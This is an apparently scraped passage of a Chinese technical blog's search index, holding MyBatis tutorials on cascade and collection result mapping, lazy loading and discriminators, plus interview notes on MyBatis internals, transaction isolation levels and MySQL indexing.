CHARSET=utf8; JavaBean 类 12345678910111213public class Department { private Long id; private String name; private List&lt;Employee&gt; employees; ...... @Override public String toString() { return "Department [id=" + id + ", name=" + name + ", employees=" + employees + "]"; }} 123456789101112131415public class Employee { private Long id; private String lastName; private String gender; private String email; private Department department; ...... @Override public String toString() { return "Employee [id=" + id + ", lastName=" + lastName + ", gender=" + gender + ", email=" + email + ", department=" + department + "]"; }} 方式一（级联属性封装）本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-9。 DAO 接口 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id);} SQL 映射文件 1234567891011121314151617181920212223&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- id：定义主键列的封装规则； column：指定列名； property：指定对应的JavaBean属性； --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- 定义普通列的封装规则，即使不指定普通列 MyBatis 也会按照默认的规则自动封装，但一般都全部写上 --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- 定义级联属性的封装规则 --&gt; &lt;result column="dept_id" property="department.id" /&gt; &lt;result column="dept_name" property="department.name" /&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select emp.id, emp.last_name, emp.gender, emp.email, dept.id as dept_id, dept.name as dept_name from t_employee emp left join t_department dept on emp.dept_id = dept.id where emp.id = #{id} &lt;/select&gt;&lt;/mapper&gt; 提示 上述 resultMap 的写法，当调用 getEmpAndDept() 方法时，可以实现级联属性的封装（即级联映射 / 级联查询）。 查询结果 1打印 getEmpAndDept() 方法的调用结果：Employee [id=6, lastName=Tom, gender=1, email=tom@gmail.com, department=Department [id=1, name=开发部门]] 方式二（嵌套结果映射）级联映射除了上面的使用方式之外，还可以使用 resultMap 的子标签 association 实现嵌套结果映射。嵌套结果映射的定义，是使用嵌套的结果映射来处理连接结果的重复子集。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-10。 属性说明 属性 描述 resultMap 结果映射的 ID，可以将此关联的嵌套结果集映射到一个合适的对象树中。它可以作为使用额外 select 语句的替代方案。它可以将多表连接操作的结果映射成一个单一的 ResultSet。这样的 ResultSet 有部分数据是重复的。为了将结果集正确地映射到嵌套的对象树中，MyBatis 允许 “串联” 结果映射，以便解决嵌套结果集的问题。 columnPrefix 当连接多个表时，你可能会不得不使用列别名来避免在 ResultSet 中产生重复的列名。指定 columnPrefix 列名前缀允许你将带有这些前缀的列映射到一个外部的结果映射中。 notNullColumn 默认情况下，在至少一个被映射到属性的列不为空时，子对象才会被创建。你可以在这个属性上指定非空的列来改变默认行为，指定后 Mybatis 将只在这些列中任意一列非空时才创建一个子对象。可以使用逗号分隔来指定多个列。默认值是 未设置（unset）。 autoMapping 如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。这个属性会覆盖全局的属性 autoMappingBehavior。特别注意，本属性对外部的结果映射无效，所以不能搭配 select 或 resultMap 元素使用。默认值是 未设置（unset）。 DAO 接口 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id);} SQL 映射文件 12345678910111213141516171819202122232425&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- id：定义主键列的封装规则； column：指定列名； property：指定对应的JavaBean属性； --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- 定义普通列的封装规则，即使不指定普通列 MyBatis 也会按照默认的规则自动封装，但一般都全部写上 --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- 定义单个级联对象的封装规则，property：指定哪个JavaBean属性是联合的对象，javaType：指定当前这个属性的对象类型（必填） --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department"&gt; &lt;id column="dept_id" property="id" /&gt; &lt;result column="dept_name" property="name" /&gt; &lt;/association&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select emp.id, emp.last_name, emp.gender, emp.email, dept.id as dept_id, dept.name as dept_name from t_employee emp left join t_department dept on emp.dept_id = dept.id where emp.id = #{id} &lt;/select&gt;&lt;/mapper&gt; 若希望 Department 的结果映射可以被重用，那么还可以使用以下的写法： 123456789101112131415161718192021222324252627&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- id：定义主键列的封装规则； column：指定列名； property：指定对应的JavaBean属性； --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- 定义普通列的封装规则，即使不指定普通列 MyBatis 也会按照默认的规则自动封装，但一般都全部写上 --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- 定义单个级联对象的封装规则 --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department" resultMap="departmentResultMap" /&gt; &lt;/resultMap&gt; &lt;resultMap type="com.clay.mybatis.bean.Department" id="departmentResultMap"&gt; &lt;id column="dept_id" property="id" /&gt; &lt;result column="dept_name" property="name" /&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select emp.id, emp.last_name, emp.gender, emp.email, dept.id as dept_id, dept.name as dept_name from t_employee emp left join t_department dept on emp.dept_id = dept.id where emp.id = #{id} &lt;/select&gt;&lt;/mapper&gt; 查询结果 1打印 getEmpAndDept() 方法的调用结果：Employee [id=8, lastName=Tom, gender=1, email=tom@gmail.com, department=Department [id=1, name=开发部门]] 方式三（嵌套 Select 查询）级联映射除了上面的使用方式之外，还可以使用 resultMap 的子标签 association 实现嵌套 Select 查询（也叫分段查询）。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-11。 属性说明 属性 描述 property 映射到列结果的字段或属性。如果 JavaBean 有这个名字的属性（property），会先使用该属性。否则 MyBatis 将会寻找给定名称的字段（field）。 无论是哪一种情形，你都可以使用常见的点式分隔形式进行复杂属性导航。比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。 javaType 一个 Java 类的全限定名，或一个类型别名。如果你映射到一个 JavaBean，那么 MyBatis 通常可以自动推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。 jdbcType JDBC 类型，所支持的 JDBC 类型参见这个表格之后的” 支持的 JDBC 类型”。只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可以为空值的列指定这个类型。 typeHandler 使用这个属性，你可以覆盖默认的类型处理器。这个属性值是一个类型处理器实现类的全限定名，或者是类型别名。 column 数据库中的列名，或者是列的别名。一般情况下，这和传递给 resultSet.getString(columnName) 方法的参数一样。特别注意：在使用复合主键的时候，你可以使用 column="{prop1=col1,prop2=col2}" 这样的语法来指定多个传递给嵌套 select 查询语句的列名。这会使得 prop1 和 prop2 作为参数对象，被设置为对应嵌套 select 语句的参数。 select 用于加载复杂类型属性的映射语句的 ID，它会从 column 属性指定的列中检索数据，作为参数传递给目标 select 语句。特别注意：在使用复合主键的时候，你可以使用 column="{prop1=col1,prop2=col2}" 这样的语法来指定多个传递给嵌套 select 查询语句的列名。这会使得 prop1 和 prop2 作为参数对象，被设置为对应嵌套 select 语句的参数。 fetchType 可选的，有效值为 lazy 和 eager。指定属性后，将在映射中忽略全局配置参数 lazyLoadingEnabled 属性的值。 DAO 接口 12345public interface DepartmentMapper { public Department getById(Long id);} 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id);} SQL 映射文件 123456789&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="com.clay.mybatis.bean.Department"&gt; select id, name from t_department where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 12345678910111213141516171819202122232425&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- id：定义主键列的封装规则； column：指定列名； property：指定对应的JavaBean属性； --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- 定义普通列的封装规则，即使不指定普通列 MyBatis 也会按照默认的规则自动封装，但一般都全部写上 --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- 定义单个级联对象的封装规则，select：表明当前 JavaBean 属性是调用 select 指定的方法来查出结果，column：指定哪一列的值作为参数传递给这个 select 方法 --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department" select="com.clay.mybatis.dao.DepartmentMapper.getById" column="dept_id"&gt; &lt;/association&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select id, last_name, gender, email, dept_id from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 查询结果 1打印 getEmpAndDept() 方法的调用结果：Employee [id=16, lastName=Tom, gender=1, email=tom@gmail.com, department=Department [id=1, name=开发部门]] 方式四（集合的嵌套结果映射）级联映射除了上面的使用方式之外，还可以使用 resultMap 的子标签 association 实现集合的嵌套结果映射（适用于集合类型）。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-12。 DAO 接口 12345public interface DepartmentMapper { public Department getDeptById(Long id);} SQL 映射文件 12345678910111213141516171819202122&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;resultMap id="deptResultMap" type="com.clay.mybatis.bean.Department"&gt; &lt;id column="dept_id" property="id" /&gt; &lt;result column="dept_name" property="name" /&gt; &lt;!-- collection 定义关联集合类型的属性的封装规则，ofType：指定集合里面元素的类型 --&gt; &lt;collection property="employees" ofType="com.clay.mybatis.bean.Employee"&gt; &lt;id column="emp_id" property="id" /&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;/collection&gt; &lt;/resultMap&gt; &lt;select id="getDeptById" parameterType="Long" resultMap="deptResultMap"&gt; select dept.id as dept_id, dept.name as dept_name, emp.id as emp_id, emp.last_name, emp.gender, emp.email from t_department dept left join t_employee emp on dept.id = emp.dept_id where dept.id = #{id} &lt;/select&gt;&lt;/mapper&gt; 查询结果 1打印 getDeptById() 方法的调用结果：Department [id=1, name=开发部门, employees=[Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, department=null], Employee [id=2, lastName=Peter, gender=1, email=peter@gmail.com, department=null]]] 方式五（集合的嵌套 Select 查询）级联映射除了上面的使用方式之外，还可以使用 resultMap 的子标签 association 实现集合的嵌套 Select 查询（也叫集合的分段查询，适用于集合类型）。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-13。 DAO 接口 12345public interface DepartmentMapper { public Department getDeptById(Long id);} 12345public interface EmployeeMapper { public List&lt;Employee&gt; getByDept(Long deptId);} SQL 映射文件 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getByDept" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name, gender, email, dept_id from t_employee where dept_id = #{deptId} &lt;/select&gt;&lt;/mapper&gt; 1234567891011121314151617181920&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;resultMap id="deptResultMap" type="com.clay.mybatis.bean.Department"&gt; &lt;id column="id" property="id" /&gt; &lt;result column="name" property="name" /&gt; &lt;!-- collection 定义关联集合类型的属性的封装规则，ofType：指定集合里面元素的类型，select：表明当前 JavaBean 属性是调用 select 指定的方法来查出结果，column：指定哪一列的值作为参数传递给这个 select 方法 --&gt; &lt;collection property="employees" ofType="com.clay.mybatis.bean.Employee" select="com.clay.mybatis.dao.EmployeeMapper.getByDept" column="id" /&gt; &lt;/resultMap&gt; &lt;select id="getDeptById" parameterType="Long" resultMap="deptResultMap"&gt; select id, name from t_department where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 查询结果 1打印 getDeptById() 方法的调用结果：Department [id=1, name=开发部门, employees=[Employee [id=1, lastName=null, gender=1, email=jim@gmail.com, department=null], Employee [id=2, lastName=null, gender=1, email=peter@gmail.com, department=null]]] 嵌套 Select 查询 &amp; 延迟加载嵌套 Select 查询这种方式虽然很简单，但在大型数据集或大型数据表上表现不佳，这个问题被称为 N+1 查询问题。概括地讲，N+1 查询问题是这样子的： 执行了一个单独的 SQL 语句来获取结果的一个列表（就是 +1）。 对列表返回的每条记录，执行一个 select 查询语句来为每条记录加载详细信息（就是 N）。 这个问题会导致成百上千的 SQL 语句被执行。有时候，我们不希望产生这样的后果，则可以全局配置 MyBatis 启用延迟加载。当启用延迟加载后，只有级联属性被使用到的时候，MyBatis 才会发出查询 SQL，以此提高级联加载的性能。 123456&lt;settings&gt; &lt;!-- 延迟加载 --&gt; &lt;setting name="lazyLoadingEnabled" value="true" /&gt; &lt;!-- 属性按需加载 --&gt; &lt;setting name="aggressiveLazyLoading" value="false" /&gt;&lt;/settings&gt; lazyLoadingEnabled：延迟加载，默认值为 false。 aggressiveLazyLoading：控制具有延迟加载特性的对象的属性的加载情况，true 表示如果对具有延迟加载特性的对象的任意调用会导致这个对象的完整加载，false 表示每种属性按照需要加载。在 MyBatis 3.4.1（包含） 版本之前，默认值为 true，之后默认值为 false。 值得一提的是，若全局配置不适合特定的需求，MyBatis 还为此提供了局部延时加载功能。在 collection 或 association 标签上加入属性值 fetchType 就可以了，其取值分别是 eager 和 lazy。 discriminator 鉴别器的使用有时候，一个数据库查询可能希望根据不同的条件返回多个不同的结果集（但总体上还是有一定的联系的）。鉴别器（discriminator）标签就是被设计来应对这种情况的，另外也能处理其它情况，例如类的继承层次结构。 鉴别器的概念很好理解，它很像 Java 语言中的 switch 语句。一个鉴别器的定义需要指定 column 和 javaType 属性。column 指定了 MyBatis 查询被比较值的地方，而 javaType 用来确保使用正确的相等测试（虽然很多情况下字符串的相等测试都可以工作）。完整的使用说明可查看 官方文档，本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-14。 DAO 接口 12345public interface DepartmentMapper { public Department getById(Long id);} 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id); } SQL 映射文件 123456789&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="com.clay.mybatis.bean.Department"&gt; select id, name from t_department where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 123456789101112131415161718192021222324252627282930&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- id：定义主键列的封装规则； column：指定列名； property：指定对应的JavaBean属性； --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- 定义普通列的封装规则，即使不指定普通列 MyBatis 也会按照默认的规则自动封装，但一般都全部写上 --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- 使用鉴别器判断某列的值，然后根据某列的值改变封装行为 --&gt; &lt;discriminator javaType="String" column="gender"&gt; &lt;case value="1" resultType="com.clay.mybatis.bean.Employee"&gt; &lt;!-- 定义单个级联对象的封装规则，select：表明当前 JavaBean 属性是调用 select 指定的方法来查出结果，column：指定哪一列的值作为参数传递给这个select方法 --&gt; &lt;association property="department" javaType="com.clay.mybatis.bean.Department" select="com.clay.mybatis.dao.DepartmentMapper.getById" column="dept_id"&gt; &lt;/association&gt; &lt;/case&gt; &lt;/discriminator&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select id, last_name, gender, email, dept_id from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 上述的 discriminator 标签作用是，当 Employee（员工） 的 gender（性别） 属性为 1 时，才级联查询 Department（部门） 的信息，否则不级联查询。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"ORM 框架面试题之一",url:"/posts/c3108f98.html",text:'MyBatisMyBatis 四大对象四大对象介绍MyBatis 的四大对象包括：Executor、StatementHandler、ParameterHandler、ResultSetHandler。四大对象的工作职责如下： Executor（执行器）：负责整个 SQL 执行过程的总体控制 StatementHandler（语句处理器）：负责和 JDBC 层交互，包括预编译 SQL 语句和执行 SQL 语句，以及调用 ParameterHandler 设置参数 ParameterHandler（参数处理器）：负责设置预编译参数 ResultSetHandler（结果集处理器）：负责将 JDBC 查询结果映射到 JavaBean 对象 四大对象的工作流程 一级缓存失效的四种场景 使用不同的 SqlSession 进行查询 同一个 SqlSession，但是查询条件不同 同一个 SqlSession，但是在两次查询期间手动清空了一级缓存 同一个 SqlSession，但是在两次查询期间执行了任何一次增删改操作 解决实体类的属性名与表的字段名不一致问题三种解决方法如下： 编写 SQL 语句时使用字段别名 在 MyBatis 的全局配置文件中开启驼峰命名规则 在 Mapper 映射文件中使用 resultMap 来自定义映射规则 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"数据库面试题之一",url:"/posts/51a718cc.html",text:'数据库数据库并发问题脏读A 事务执行过程中，B 事务读取了 A 事务的修改。但是由于某些原因，A 事务没有完成提交，发生 RollBack 操作，则 B 事务所读取的数据就会是不正确的，这个未提交数据就是脏读（Dirty Read）。脏读产生的流程如下： 幻读B 事务读取了两次数据，在这两次的读取过程中 A 事务添加了数据，B 事务的这两次读取出来的集合不一样。幻读看起来和不可重复读差不多，但幻读强调的集合的增减，而不是单独一条数据的修改。幻读产生的流程如下： 不可重复读B 事务读取了两次数据，在这两次的读取过程中 A 事务修改了数据，B 事务的这两次读取出来的数据不一样。B 事务这种读取的结果，即为不可重复读（Nonrepeatable Read）。不可重复读的产生的流程如下： 第一类丢失更新在完全未隔离事务的情况下，两个事务更新同一条数据资源，某一事务完成，另一事务异常终止，回滚造成第一个完成的更新也同时丢失 。第一类丢失更新的问题，在现代关系型数据库已经不会发生，这里不再累述。 第二类丢失更新不可重复读有一种特殊情况，两个事务更新同一条数据资源，后完成的事务会造成先完成的事务更新丢失，这种情况就是第二类丢失更新。主流的数据库已经默认屏蔽了第一类丢失更新问题（即：后做的事务撤销，发生回滚造成已完成事务的更新丢失），但日常开发的时候仍需要特别注意第二类丢失更新。它产生的流程如下： 数据库隔离级别为了解决上面提及的数据库并发问题，主流关系型数据库都会提供四种事务隔离级别： 读未提交（Read Uncommitted）在该隔离级别，所有事务都可以看到其他未提交事务的执行结果。该隔离级别是最低的隔离级别，虽然拥有超高的并发处理能力及很低的系统开销，但很少用于实际应用。因为采用这种隔离级别只能防止第一类更新丢失问题，不能解决脏读，幻读及不可重复读问题。 读已提交（Read Committed）这是大多数数据库系统的默认隔离级别（但不是 MySQL 默认的），例如 Oracle 数据库。它满足了隔离的简单定义：一个事务只能看见已经提交事务所做的改变。这种隔离级别可以防止脏读问题，但会出现幻读及不可重复读问题。 可重复读（Repeatable Read）这是 MySQL 的默认事务隔离级别，它确保在整个事务过程中，对同一条数据的读取结果是相同的，不管其他事务是否在对共享数据进行更新，也不管其他事务更新提交与否，这种隔离级别可以防止除幻读外的其他问题。 串行化（Serializable）这是最高的隔离级别，它通过强制事务排序，使之不可能相互冲突，从而解决幻读、第二类更新丢失问题。在这个级别，可以解决上面提到的所有并发问题，但可能导致大量的超时现象和锁竞争，通常数据库不会用这个隔离级别，可以其他的机制来解决这些问题，例如乐观锁和悲观锁。 案例说明 上图中是典型的第二类丢失更新问题，后果异常严重。当数据库隔离级别为读已提交（Read Committed）及以下隔离级别时，会出现不可重复读的现象。从上面的表格可以看出，当事务隔离级别设置为可重复读（Repeatable Read）时，可以避免不可重复读的现象出现。 总结这四种隔离级别会产生的问题如下（YES 表示存在对应的问题）： MySQL索引索引的类型（四种） FULLTEXT：即为全文索引，目前只有 MyISAM 引擎支持，其可以在 CREATE TABLE，ALTER TABLE，CREATE INDEX 使用，不过目前只有 CHAR、VARCHAR、TEXT 列上可以创建全文索引 HASH：由于 HASH 的唯一性及类似键值对的形式，很适合作为索引，HASH 索引可以一次定位，不需要像树形索引那样逐层查找，因此具有极高的效率。但是，这种高效是有条件的，即只在 “=” 和 “in” 条件下才高效，对于范围查询、排序及组合索引仍然效率不高 BTREE：一种将索引值按一定的算法，存入一个树形的数据结构中（二叉树），每次查询都是从树的入口 Root 开始，依次遍历 Node，获取 Leaf，这是 MySQL 里默认和最常用的索引类型 RTREE：在 MySQL 很少使用，仅支持 geometry 数据类型，支持该类型的存储引擎有 MyISAM、BDb、InnoDb、NDb、Archive 相对于 BTREE，RTREE 的优势在于范围查找。 索引的种类（五种） 普通索引：仅加速查询 全文索引：对文本的内容进行分词和搜索 唯一索引：加速查询 + 列值唯一（可以有 NULL） 主键索引：加速查询 + 列值唯一（不可以有 NULL） + 表中只能有一个主键索引 组合索引：多列值组成一个索引，专门用于组合搜索，其效率大于索引合并（使用多个单列索引组合搜索） 创建索引的时机一般来说，在 WHERE 和 JOIN 子句中出现的列需要建立索引，但也不完全如此，因为 MySQL 只对 &lt;、&lt;=、=、&gt;、&gt;=、BETWEEN、IN 以及某些时候的 LIKE 才会使用索引。例如下述的 SQL 语句，就需要对 city 和 age 列建立索引，由于 mytable_m 表的 userame 也出现在了 JOIN 子句中，因此也有对它建立索引的必要。 1SELECT t.Name FROM mytable_t LEFT JOIN mytable_m ON t.Name=m.username WHERE m.age=20 AND m.city=\'郑州\' ; 特别注意：上面提到只有某些时候的 LIKE 才需建立索引，因为在以通配符 % 开头作查询时，MySQL 不会使用索引；只有以通配符 % 结尾做查询时，MySQL 才会使用到索引。但有一种情况例外，那就是当触发了覆盖索引（select 的数据列只从索引中就能够取得，不必读取数据行，换句话说查询列要被所建的索引覆盖）的情况下，以通配符 % 开头作查询 MySQL 也会使用索引。例如：如果表里面只有 id 和 username 两个字段且都加了索引，那么 select * like \'%username\' 查询也是会使用索引的，前提是 select 数据列都加了索引。 哪些字段应该创建索引 增删改非常频繁的字段不适合作为索引 查询中与其他表关联的字段，例如外键应该建立索引 WHERE 和 JOIN 子句中，较频繁作为查询条件的字段应该创建索引 查询中排序（order by）、分组（group by）、统计的字段应该建立索引 唯一性太差的字段不适合创建索引，尽管频繁作为查询条件，例如：性别字段 索引不生效的情况 对于多列索引，如果不是使用的第一部分，则不会使用索引 如果 MySQL 估算使用全表扫描要比使用索引快，则不会使用索引 like 查询，即是以 % 开头的查询不会使用索引，除非 select 数据列都加了索引 如果列类型是字符串，那一定要在条件中将数据使用单引号包起来，否则索引不生效 如果条件中有 or，即使其中有部分条件带索引也不会使用。换言之，必须所有列都建有索引才有效 索引使用的代价 索引虽然可以大大提高了查询速度，但同时也会降低更新表的速度，如对表进行 INSERT、UPDATE 和 DELETE 操作；因为更新表时，MySQL 不仅要保存数据，还要更新索引文件 建立索引会占用更多的磁盘空间，这是因为需要分配磁盘空间给索引文件，一般情况这个问题不太严重，但如果在一个大表上创建了多种组合索引，索引文件的体积会膨胀得很快 索引使用注意事项 针对普通查询 避免使用 select * 连表时注意条件类型需一致 创建表时尽量时 char 代替 varchar &nbsp;count (1) 或 count (列) 代替&nbsp;count (*) 使用表连接（JOIN）来代替子查询（Sub-Queries） 针对索引使用 使用组合索引代替多个单列索引（经常使用多个条件查询时） 索引散列值（重复多的值）不适合建索引，例如：性别字段不适合建索引 索引不会包含有 NULL 值的列，只要列中包含有 NULL 值都将不会被包含在索引中，组合索引中只要有一列含有 NULL 值，那么这一列对于此组合索引就是无效的，因此在数据库设计时不要让字段的默认值为 NULL 不要在列上进行运算，例如 select * from users where YEAR(adddate)&lt;2007，将在每个行记录上进行运算，这将导致索引失效而进行全表扫描，因此可以改成 select * from users where adddate&lt;’2007-01-01′ 尽量使用短索引，对串列进行索引，如果可能应该指定一个前缀长度。例如：如果有一个 CHAR (255) 的列，如果在前 10 个或 20 个字符内，多数值是惟一的，那么就不要对整个列进行索引；短索引不仅可以提高查询速度，还可以节省磁盘空间和 I/O 操作 MySQL 5.0 之前，SQL 查询只能使用一个索引，因此如果 WHERE 子句中已经使用了索引的话，那么 order by、group by 中的列是不会使用索引的。因此如果数据库默认排序可以符合要求的情况下，不要使用排序操作，同时尽量使用不包含多个列的排序，如果需要最好给这些列创建组合索引 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"MyBatis 入门教程之三",url:"/posts/2092c024.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 SQL 映射文件MyBatis 的真正强大在于它的语句映射，这是它的魔力所在。由于它的异常强大，映射器的 XML 文件就显得相对简单。如果拿它跟具有相同功能的 JDBC 代码进行对比，会立即发现省掉了将近 95% 的代码。MyBatis 致力于减少使用成本，让用户能更专注于 SQL 代码。SQL 映射文件只有很少的几个顶级标签（按照应被定义的顺序列出）： cache – 该命名空间的缓存配置 cache-ref – 引用其它命名空间的缓存配置 resultMap – 描述如何从数据库结果集中加载对象，是最复杂也是最强大的标签 parameterMap – 老式风格的参数映射，此标签已被废弃，并可能在将来被移除，请使用行内参数映射 sql – 可被其它语句引用的可重用语句块 insert – 映射插入语句 update – 映射更新语句 delete – 映射删除语句 select – 映射查询语句 增删改查本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-4。 select 标签查询标签是 MyBatis 中最常用的标签之一，光能把数据存到数据库中价值并不大，还要能重新取出来才有用，多数应用也都是查询比修改要频繁。MyBatis 的基本原则之一是：在每个插入、更新或删除操作之间，通常会执行多个查询操作。因此，MyBatis 在查询和结果映射做了相当多的改进。一个简单查询的 select 标签是非常简单的。比如： 123&lt;select id="selectPerson" parameterType="int" resultType="hashmap"&gt; SELECT * FROM PERSON WHERE ID = #{id}&lt;/select&gt; 这个语句名为 selectPerson，接受一个 int（Integer）类型的参数，并返回一个 HashMap 类型的对象，其中的键是列名，值便是结果行中的对应值。特别注意参数符号 #{id}，这是用来告诉 MyBatis 创建一个预处理语句（PreparedStatement）参数，在 JDBC 中，这样的一个参数在 SQL 中会由一个 ? 来标识，并被传递到一个新的预处理语句中，就像这样： 1234long id = 1001;String selectPerson = "SELECT * FROM PERSON WHERE ID=?";PreparedStatement ps = conn.prepareStatement(selectPerson);ps.setInt(1, id); select 标签允许配置很多属性来配置每条语句的行为细节，例如： 123456789101112&lt;select id="selectPerson" parameterType="int" parameterMap="deprecated" resultType="hashmap" resultMap="personResultMap" flushCache="false" useCache="true" timeout="10" fetchSize="256" statementType="PREPARED" resultSetType="FORWARD_ONLY"&gt; insert、update、delete 标签数据更改语句 insert，update 和 delete 的使用非常接近： 1234567891011121314151617181920212223&lt;insert id="insertAuthor" parameterType="domain.blog.Author" flushCache="true" statementType="PREPARED" keyProperty="" keyColumn="" useGeneratedKeys="" timeout="20"&gt;&lt;update id="updateAuthor" parameterType="domain.blog.Author" flushCache="true" statementType="PREPARED" timeout="20"&gt;&lt;delete id="deleteAuthor" parameterType="domain.blog.Author" flushCache="true" statementType="PREPARED" timeout="20"&gt; 下面是 insert，update 和 delete 语句的使用示例： 1234567891011121314151617&lt;insert id="insertAuthor" parameterType="domain.blog.Author"&gt; insert into Author (id, username, password, email,bio) values (#{id}, #{username}, #{password}, #{email}, #{bio})&lt;/insert&gt;&lt;update id="updateAuthor" parameterType="domain.blog.Author"&gt; update Author set username = #{username}, password = #{password}, email = #{email}, bio = #{bio} where id = #{id}&lt;/update&gt;&lt;delete id="deleteAuthor"&gt; delete from Author where id = #{id}&lt;/delete&gt; 提示 MyBatis 允许增删改的 DAO 